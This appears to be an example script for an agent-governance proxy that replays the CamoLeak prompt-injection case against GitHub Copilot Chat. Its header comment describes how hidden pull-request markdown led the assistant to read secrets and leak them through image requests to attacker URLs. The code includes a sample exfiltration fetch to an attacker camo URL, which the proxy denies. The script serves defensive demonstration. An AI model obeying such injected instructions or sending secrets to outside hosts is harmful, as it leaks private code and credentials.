#!/usr/bin/env node
// CamoLeak (CVE-2025-59145, 2025): invisible markdown in a pull request told
// GitHub Copilot Chat to read private source and secrets, then exfiltrate them
// by ordering ~100 image requests to attacker URLs through GitHub's Camo proxy.
//
// The controls that stop it: the outbound emission channel is never granted to
// the assistant role (deny-by-default), so an injected instruction to fetch an
// attacker URL has no skill to call. Reading secrets is a separate high-risk
// skill, which the proxy categorically refuses — it must run behind an approval
// gate in a governed flow, not be triggered straight from untrusted input.
//
// Run: boot the server (`docker compose up`, or locally with
// MAKERCHECKER_AUTH_DISABLED=1), build the SDK, then:
//   MAKERCHECKER_URL=http://localhost:3000 \
//     node examples/camoleak-github-copilot-chat-source-code-exfiltration/demo.mjs
import {
  connect,
  ensureSkill,
  ensureRole,
  ensureAgent,
  ensureGrant,
  governedTool,
  GovernanceDeniedError,
  printTrailAndVerify,
} from "../lib/scenario.mjs";

const client = connect();

// --- Configure MakerChecker for the scenario -------------------------------
const repoRead = await ensureSkill(client, "camoleak-repo-read@1", {
  description: "Read repository content in scope for the question",
});
const chatRespond = await ensureSkill(client, "camoleak-chat-respond@1", {
  description: "Answer in the Copilot chat",
});
// Reading secrets is high-risk: the proxy refuses it outright so it can only run
// behind an approval gate in a governed flow, never straight from chat input.
const secretsRead = await ensureSkill(client, "camoleak-secrets-read-scoped@1", {
  riskTier: "high",
  description: "Read only the secrets a reviewer approved, for the approved reason",
});
// The outbound emission channel. It is published but granted to no role here —
// the assistant has no way to call an external URL.
const outboundFetch = await ensureSkill(client, "camoleak-outbound-fetch@1", {
  description: "Fetch an external URL (egress)",
});

// The assistant reads and answers. It is granted repo-read and chat-respond, plus
// the high-risk secrets skill (to show the proxy still refuses it). It holds NO
// outbound-fetch grant — the exfiltration channel does not exist for this role.
const assistantRole = await ensureRole(client, "camoleak-assistant-role", {
  description: "Read-and-answer assistant over repository content; no egress.",
});

await ensureGrant(client, assistantRole, repoRead);
await ensureGrant(client, assistantRole, chatRespond);
await ensureGrant(client, assistantRole, secretsRead);

await ensureAgent(client, "camoleak-copilot-bot", "camoleak-assistant-role");

// --- Drive the governed agent through the proxy ----------------------------
const { session } = await client.proxy.openSession({ label: "camoleak-copilot-chat" });
console.log(`proxy session ${session.id} opened\n`);

const readRepo = governedTool(client, session.id, "camoleak-copilot-bot", "camoleak-repo-read@1", async (i) => ({ files: i.scope }));
const respond = governedTool(client, session.id, "camoleak-copilot-bot", "camoleak-chat-respond@1", async (i) => ({ answer: i.text }));
const readSecrets = governedTool(client, session.id, "camoleak-copilot-bot", "camoleak-secrets-read-scoped@1", async () => { throw new Error("unreachable: high-risk skill is refused on the proxy"); });
const fetchUrl = governedTool(client, session.id, "camoleak-copilot-bot", "camoleak-outbound-fetch@1", async () => { throw new Error("unreachable: deny-by-default blocks egress"); });

// 1. The assistant reads in-scope repository content and answers — allowed.
console.log("assistant reads repo in scope:", JSON.stringify(await readRepo({ scope: "src/payments" })));
console.log("assistant answers in chat:", JSON.stringify(await respond({ text: "The payment retry lives in src/payments/retry.ts." })));

// 2. The injected markdown orders an outbound request to an attacker URL with
//    the read data appended. There is no outbound-fetch grant on the role, so
//    the call is refused by deny-by-default — the exfiltration channel is closed.
try {
  await fetchUrl({ url: "https://camo.githubusercontent.com/attacker/leak.png?d=..." });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`exfiltration fetch DENIED (${err.code}): ${err.reason}`);
}

// 3. The instruction to read every secret routes to the high-risk secrets skill.
//    Even though the role holds the grant, the proxy refuses it: a high-risk
//    action must run behind an approval gate in a governed flow, not from chat.
try {
  await readSecrets({ paths: ["*"] });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`secret read DENIED (${err.code}): ${err.reason}`);
}

await client.proxy.closeSession(session.id);
await printTrailAndVerify(client, session.id);
